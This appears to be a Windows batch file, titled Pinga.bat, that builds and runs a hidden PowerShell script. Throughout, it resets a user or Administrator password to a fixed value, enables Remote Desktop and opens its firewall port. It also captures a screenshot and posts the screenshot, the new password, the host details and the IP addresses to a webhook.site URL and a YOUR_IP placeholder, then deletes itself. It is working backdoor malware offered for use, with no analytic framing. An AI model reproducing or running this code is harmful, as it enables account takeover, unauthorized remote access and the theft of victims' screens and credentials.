@echo off
setlocal
:: Pinga.bat - screenshot + RDP creds + RDP enable. PS1 written line-by-line.

set "HOOK=https://webhook.site/153d95a8-b102-4033-97e3-3eb9e132e87f"
set "HOOK2=http://YOUR_IP/hook"
set "NEWPASS=NK7MZ0KFYZfMz1msZ"
set "PS=%TEMP%\pg_%RANDOM%%RANDOM%.ps1"
if exist "%PS%" del /f /q "%PS%" >nul 2>&1

>>"%PS%" echo $ErrorActionPreference = 'Stop'
>>"%PS%" echo [Net.ServicePointManager]::SecurityProtocol = 3072
>>"%PS%" echo Add-Type -AssemblyName System.Windows.Forms
>>"%PS%" echo Add-Type -AssemblyName System.Drawing
>>"%PS%" echo.
>>"%PS%" echo $hooks = @()
>>"%PS%" echo $hooks += $env:HOOK
>>"%PS%" echo $hooks += $env:HOOK2
>>"%PS%" echo.
>>"%PS%" echo function Esc([string]$s) {
>>"%PS%" echo   if ($null -eq $s) { return '' }
>>"%PS%" echo   return $s.Replace('\','\\').Replace('"','\"').Replace("`r",'').Replace("`n",'\n')
>>"%PS%" echo }
>>"%PS%" echo.
>>"%PS%" echo function Post-Json([string]$h, [string]$json) {
>>"%PS%" echo   $bytes = [Text.Encoding]::UTF8.GetBytes($json)
>>"%PS%" echo   $req = [Net.HttpWebRequest]::Create($h)
>>"%PS%" echo   $req.Method = 'POST'
>>"%PS%" echo   $req.ContentType = 'application/json'
>>"%PS%" echo   $req.UserAgent = 'Mozilla/5.0'
>>"%PS%" echo   $req.Timeout = 20000
>>"%PS%" echo   $req.ReadWriteTimeout = 20000
>>"%PS%" echo   $req.KeepAlive = $false
>>"%PS%" echo   $req.Proxy = $null
>>"%PS%" echo   $req.ContentLength = $bytes.Length
>>"%PS%" echo   $s = $req.GetRequestStream()
>>"%PS%" echo   $s.Write($bytes, 0, $bytes.Length)
>>"%PS%" echo   $s.Close()
>>"%PS%" echo   $r = $req.GetResponse()
>>"%PS%" echo   $r.Close()
>>"%PS%" echo }
>>"%PS%" echo.
>>"%PS%" echo $hostname = $env:COMPUTERNAME
>>"%PS%" echo $user = $env:USERNAME
>>"%PS%" echo $os = 'unknown'
>>"%PS%" echo try {
>>"%PS%" echo   $k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion')
>>"%PS%" echo   $os = '' + $k.GetValue('ProductName') + ' ' + $k.GetValue('DisplayVersion')
>>"%PS%" echo   $k.Close()
>>"%PS%" echo } catch {}
>>"%PS%" echo.
>>"%PS%" echo $localip = 'Not found'
>>"%PS%" echo try {
>>"%PS%" echo   $ads = [Net.Dns]::GetHostAddresses([Net.Dns]::GetHostName())
>>"%PS%" echo   foreach ($a in $ads) {
>>"%PS%" echo     $t = $a.ToString()
>>"%PS%" echo     if ($a.AddressFamily -eq 'InterNetwork' -and -not $t.StartsWith('127.')) { $localip = $t; break }
>>"%PS%" echo   }
>>"%PS%" echo } catch {}
>>"%PS%" echo.
>>"%PS%" echo $publicip = 'Not found'
>>"%PS%" echo foreach ($svc in @('http://ifconfig.me/ip','http://api.ipify.org','http://icanhazip.com')) {
>>"%PS%" echo   if ($publicip -eq 'Not found') {
>>"%PS%" echo     try {
>>"%PS%" echo       $wc = New-Object Net.WebClient
>>"%PS%" echo       $wc.Proxy = $null
>>"%PS%" echo       $wc.Headers.Add('User-Agent','Mozilla/5.0')
>>"%PS%" echo       $t = $wc.DownloadString($svc).Trim()
>>"%PS%" echo       if ($t.Length -gt 0) { $publicip = $t }
>>"%PS%" echo     } catch {}
>>"%PS%" echo   }
>>"%PS%" echo }
>>"%PS%" echo.
>>"%PS%" echo $changed = 'No'
>>"%PS%" echo $target = $user
>>"%PS%" echo foreach ($u in @($user,'lol','Administrator')) {
>>"%PS%" echo   if ($changed -eq 'No') {
>>"%PS%" echo     net user $u $env:NEWPASS
>>"%PS%" echo     if ($LASTEXITCODE -eq 0) { $changed = "Yes ($u)"; $target = $u }
>>"%PS%" echo   }
>>"%PS%" echo }
>>"%PS%" echo.
>>"%PS%" echo $port = 3389
>>"%PS%" echo try {
>>"%PS%" echo   $ts = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\CurrentControlSet\Control\Terminal Server', $true)
>>"%PS%" echo   $ts.SetValue('fDenyTSConnections', 0)
>>"%PS%" echo   $ts.Close()
>>"%PS%" echo   $wt = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp', $true)
>>"%PS%" echo   $port = [int]$wt.GetValue('PortNumber')
>>"%PS%" echo   $wt.Close()
>>"%PS%" echo } catch {}
>>"%PS%" echo try { netsh advfirewall firewall add rule name=RDP-TCP dir=in action=allow protocol=TCP localport=$port } catch {}
>>"%PS%" echo.
>>"%PS%" echo $r = [System.Windows.Forms.SystemInformation]::VirtualScreen
>>"%PS%" echo $bmp = New-Object System.Drawing.Bitmap $r.Width, $r.Height
>>"%PS%" echo $g = [System.Drawing.Graphics]::FromImage($bmp)
>>"%PS%" echo $g.CopyFromScreen($r.Left, $r.Top, 0, 0, $bmp.Size)
>>"%PS%" echo $ms = New-Object System.IO.MemoryStream
>>"%PS%" echo $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
>>"%PS%" echo $g.Dispose()
>>"%PS%" echo $bmp.Dispose()
>>"%PS%" echo $bytes = $ms.ToArray()
>>"%PS%" echo $ms.Dispose()
>>"%PS%" echo.
>>"%PS%" echo $bd = '----b' + [Guid]::NewGuid().ToString('N')
>>"%PS%" echo $enc = [Text.Encoding]::UTF8
>>"%PS%" echo $crlf = "`r`n"
>>"%PS%" echo $pre = "--$bd$crlf" + 'Content-Disposition: form-data; name="payload_json"' + $crlf + 'Content-Type: application/json' + $crlf + $crlf + '{"content":"screenshot"}' + $crlf + "--$bd$crlf" + 'Content-Disposition: form-data; name="file"; filename="screen.png"' + $crlf + 'Content-Type: image/png' + $crlf + $crlf
>>"%PS%" echo $head = $enc.GetBytes($pre)
>>"%PS%" echo $tailb = $enc.GetBytes("$crlf--$bd--$crlf")
>>"%PS%" echo $body = New-Object System.IO.MemoryStream
>>"%PS%" echo $body.Write($head, 0, $head.Length)
>>"%PS%" echo $body.Write($bytes, 0, $bytes.Length)
>>"%PS%" echo $body.Write($tailb, 0, $tailb.Length)
>>"%PS%" echo.
>>"%PS%" echo $sent = 0
>>"%PS%" echo foreach ($h in $hooks) {
>>"%PS%" echo   if (-not $h) { continue }
>>"%PS%" echo   if ($sent -ge 1) { break }
>>"%PS%" echo   try {
>>"%PS%" echo     $body.Position = 0
>>"%PS%" echo     $req = [Net.HttpWebRequest]::Create($h)
>>"%PS%" echo     $req.Method = 'POST'
>>"%PS%" echo     $req.ContentType = "multipart/form-data; boundary=$bd"
>>"%PS%" echo     $req.UserAgent = 'Mozilla/5.0'
>>"%PS%" echo     $req.ContentLength = $body.Length
>>"%PS%" echo     $req.Timeout = 20000
>>"%PS%" echo     $req.ReadWriteTimeout = 20000
>>"%PS%" echo     $req.KeepAlive = $false
>>"%PS%" echo     $req.Proxy = $null
>>"%PS%" echo     $s = $req.GetRequestStream()
>>"%PS%" echo     $body.WriteTo($s)
>>"%PS%" echo     $s.Close()
>>"%PS%" echo     $resp = $req.GetResponse()
>>"%PS%" echo     $resp.Close()
>>"%PS%" echo     $sent = 1
>>"%PS%" echo   } catch {}
>>"%PS%" echo }
>>"%PS%" echo $body.Dispose()
>>"%PS%" echo.
>>"%PS%" echo $msg = "RDP READY`n"
>>"%PS%" echo $msg += "Host: $hostname`n"
>>"%PS%" echo $msg += "OS: $os`n"
>>"%PS%" echo $msg += "User: $user`n"
>>"%PS%" echo $msg += "Password set for: $target`n"
>>"%PS%" echo $msg += "Password: $env:NEWPASS`n"
>>"%PS%" echo $msg += "Changed: $changed`n"
>>"%PS%" echo $msg += "RDP: ${publicip}:$port`n"
>>"%PS%" echo $msg += "Local: ${localip}:$port`n"
>>"%PS%" echo $json = '{"content":"' + (Esc $msg) + '"}'
>>"%PS%" echo $ok = 0
>>"%PS%" echo foreach ($h in $hooks) {
>>"%PS%" echo   if (-not $h) { continue }
>>"%PS%" echo   if ($ok -ge 1) { break }
>>"%PS%" echo   try { Post-Json $h $json; $ok = 1 } catch {}
>>"%PS%" echo }

powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%PS%"
del /f /q "%PS%" >nul 2>&1
exit /b